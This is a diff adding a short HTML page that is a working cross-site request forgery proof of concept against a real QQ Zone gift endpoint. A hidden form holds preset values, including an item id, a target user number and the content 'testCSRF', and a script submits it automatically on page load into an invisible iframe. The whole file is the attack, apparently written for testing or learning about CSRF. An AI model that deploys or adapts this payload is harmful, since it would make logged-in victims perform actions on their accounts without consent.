@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Document</title>
+</head>
+<body>    
+    <form id="form" action="https://mobile.qzone.qq.com/gift/giftweb" method="post" target="iframe">
+        <input type="text" name="action" value="3">
+        <input type="text" name="itemid" value="111694">
+        <input type="text" name="struin" value="429740278">
+        <input type="text" name="content" value="testCSRF">
+        <input type="text" name="format" value="json">
+        <input type="text" name="isprivate" value="1">
+    </form>
+    <iframe name="iframe" frameborder="0"></iframe>
+
+    <script>
+        document.getElementById('form').submit();
+    </script>
+</body>
+</html>
